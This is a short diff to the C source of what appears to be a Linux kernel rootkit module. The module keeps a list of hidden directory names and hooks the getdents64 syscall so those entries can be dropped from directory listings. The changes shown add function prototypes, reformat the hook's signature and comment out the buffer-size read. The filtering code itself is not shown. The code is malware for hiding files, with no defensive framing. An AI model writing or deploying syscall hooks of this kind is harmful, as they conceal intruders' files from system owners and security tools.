@@ -14,6 +14,12 @@ struct hidden_dir_entry {
 static LIST_HEAD(hidden_dirs_list);
 static DEFINE_SPINLOCK(hidden_dirs_lock);
 
+// Function prototypes
+int add_hidden_dir(const char *dirname);
+int remove_hidden_dir(const char *dirname);
+int is_hidden(const char *name);
+asmlinkage int getdents64_hook(const struct pt_regs *regs);
+
 /**
  * @brief Adds a directory name to the dynamic hidden directories list.
  *
@@ -97,8 +103,7 @@ int is_hidden(const char *name)
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);
 
 // Function to hook the getdents64 syscall
-asmlinkage int getdents64_hook(const struct pt_regs *regs)
-{
+asmlinkage int getdents64_hook(const struct pt_regs *regs){
     // Store the result (number of bytes read) by the original syscall
     int ret;
 
@@ -108,7 +113,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs)
         (struct linux_dirent64 __user *)regs->si;
 
     // Get the size of the buffer
-    unsigned int count = (unsigned int)regs->dx;
+    // unsigned int count = (unsigned int)regs->dx;
 
     // Call the original getdents64 syscall, to have the buffer updated
     // Next, we just need to check directories in the buffer,
